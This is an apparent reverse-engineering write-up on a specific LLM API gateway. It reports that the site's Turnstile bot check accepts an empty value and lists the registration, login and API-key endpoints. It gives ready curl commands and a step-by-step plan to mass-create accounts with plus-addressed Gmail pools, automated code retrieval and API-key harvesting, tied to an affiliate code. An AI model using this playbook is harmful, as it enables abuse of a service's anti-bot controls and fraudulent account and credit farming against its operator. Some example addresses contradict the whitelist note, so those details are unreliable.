# Unimodel.ai — API RE Case Study

**Date**: 2026-06-16
**Target**: https://www.unimodel.ai
**Type**: LLM API gateway (OpenAI-compatible endpoints)
**Affiliate link format**: `?aff=UQrM`

## Key Finding: Empty Turnstile Accepted

The site uses Cloudflare Turnstile but accepts **empty string** for the turnstile parameter on ALL registration/verification endpoints. This means:
- No 2captcha needed
- No browser needed
- Pure curl/Python works

## API Endpoints (extracted from `index.f571e8b4c7.js`)

```
BASE_URL: https://www.unimodel.ai (relative, same domain)
AUTH: Session cookie (withCredentials: true)
HEADERS: New-Api-User: {uid from localStorage}

ENDPOINTS:
  GET  /api/verification?email={email}&turnstile=     → send verification code
  POST /api/user/register?turnstile=                  → register account
  POST /api/user/login?turnstile={token}              → login (turnstile optional)
  POST /api/user/login/2fa                            → 2FA login
  GET  /api/user/logout                               → logout
  GET  /api/user/self                                 → current user info
  GET  /api/token/?p={page}&size={size}               → list API keys
  GET  /api/token/search?keyword=&token=&p=&size=     → search API keys
  GET  /api/reset_password?email={email}&turnstile=   → password reset
  GET  /api/oauth/state?aff={aff}                     → OAuth state (returns redirect URL)
  GET  /api/oauth/wechat?code={code}                  → WeChat OAuth
```

## Registration Flow (Pure API)

```bash
# Step 1: Send verification code (empty turnstile works!)
curl -s "https://www.unimodel.ai/api/verification?email=user@example.com&turnstile="
# Returns: {"message":"","success":true}

# Step 2: Register (need verification code from email)
curl -s -X POST "https://www.unimodel.ai/api/user/register?turnstile=" \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"Pass123!","email":"user@example.com","code":"123456"}'

# Step 3: Login
curl -s -X POST "https://www.unimodel.ai/api/user/login?turnstile=" \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"Pass123!"}' \
  -c cookies.txt

# Step 4: Get API keys
curl -s "https://www.unimodel.ai/api/token/?p=1&size=10" -b cookies.txt
```

## Email Domain Whitelist

The site has an email domain whitelist active. Confirmed working:
- ✅ `@gmail.com`
- ❌ `@example.com` (blocked: "email address is not allowed")
- ❌ Disposable email domains (likely blocked)

For mass registration: use Gmail plus addressing (`user@example.com`, `user@example.com`).

## Anti-Bot Notes

- Turnstile parameter: accepts empty string (no solver needed)
- Rate limiting: unknown (not tested at scale)
- IP blocking: not observed from datacenter IP
- Fingerprinting: none observed (standard axios client)
- User-Agent: standard browser UA sufficient

## Architecture

- Frontend: React SPA (Vite-bundled)
- API client: axios with `withCredentials: true`
- Auth: Session cookie + `New-Api-User` header (localStorage uid)
- Base URL: relative (empty string in axios config → same domain)

## Mass Account Creation Strategy

1. Generate email pool: `basename+{1..1000}@gmail.com`
2. For each email: GET /api/verification → code arrives in Gmail inbox
3. Read code from Gmail (IMAP/API) → POST /api/user/register
4. Login → GET /api/token → extract API key
5. Store: {email, username, password, apiKey}
6. Rate limit: 2-3 sec between requests recommended
